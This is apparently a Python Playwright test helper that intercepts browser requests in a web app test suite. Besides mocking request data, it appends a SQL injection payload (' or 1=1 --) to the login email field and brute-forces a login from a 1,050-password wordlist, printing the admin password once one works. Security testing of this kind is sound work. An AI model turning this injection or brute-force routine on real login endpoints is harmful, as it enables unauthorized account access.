import asyncio
from typing import Any

import allure
from playwright.async_api import Page
from playwright.async_api._generated import APIResponse, Request, Route

from constants import SessionConstants
from src.api.api import AsyncAPI


class AsyncInterceptor:
    MOCK_DATA: dict = {}

    def __init__(self, page: Page) -> None:
        self.page: Page = page

    @allure.step
    async def mock_feedback_request(self, url: str, mock_data: dict) -> None:
        self.MOCK_DATA = mock_data
        await self.page.route(url, self.handle)

    async def handle(self, route: Route, request: Request) -> None:
        post_data_temp = request.post_data_json
        for key, value in self.MOCK_DATA.items():
            post_data_temp[key] = value  # type: ignore
        await route.continue_(post_data=post_data_temp)

    @allure.step
    async def login_sql_injection(
        self,
    ) -> None:
        await self.page.route("**/login", self.sql_injection)

    @staticmethod
    async def sql_injection(route: Route, request: Request) -> None:
        post_data_temp: Any = request.post_data_json
        post_data_temp["email"] = post_data_temp["email"] + "' or 1=1 --"
        await route.continue_(post_data=post_data_temp)

    @staticmethod
    @allure.step
    async def brute_force_login(username: str, async_api: AsyncAPI) -> None:
        with open(SessionConstants.BEST_1050_PASSWORDS, encoding="utf-8") as file:
            passwords = file.read().rstrip("\n")
        passwords_list: list = passwords.split("\n")
        for password in passwords_list:
            task = asyncio.create_task(async_api.async_login({"email": username, "password": password}))
            response: APIResponse = await task
            if response.ok:
                print(f"Admin password is: {password}")
                return
